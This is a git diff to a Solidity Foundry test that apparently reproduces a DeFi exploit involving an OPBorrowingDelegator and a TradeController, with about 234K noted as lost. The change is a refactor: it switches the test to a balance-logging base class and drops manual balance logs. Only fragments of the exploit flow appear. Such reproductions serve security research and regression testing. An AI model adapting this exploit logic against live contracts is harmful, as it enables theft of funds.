@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~234K
@@ -84,7 +84,7 @@ interface IOPBorrowingDelegator {
     ) external;
 }
 
-contract ContractTest is Test {
+contract ContractTest is BaseTestWithBalanceLog {
     struct SwapDescription {
         address srcToken;
         address dstToken;
@@ -135,14 +135,9 @@ contract ContractTest is Test {
         vm.label(address(OPBorrowingDelegator), "OPBorrowingDelegator");
     }
 
-    function testExploit() public {
+    function testExploit() public balanceLog{
         // First TX
         deal(address(this), 5 ether);
-        emit log_named_decimal_uint(
-            "Exploiter BNB balance before attack",
-            address(this).balance,
-            18
-        );
 
         USDC.approve(address(Router), type(uint256).max);
         BUSDT.approve(address(Router), type(uint256).max);
@@ -241,12 +236,6 @@ contract ContractTest is Test {
         TradeController.payoffTrade(marketId, true);
         WBNB.withdraw(WBNB.balanceOf(address(this)));
         BUSDTToWBNB();
-
-        emit log_named_decimal_uint(
-            "Exploiter BNB balance after attack",
-            address(this).balance,
-            18
-        );
     }
 
     receive() external payable {}
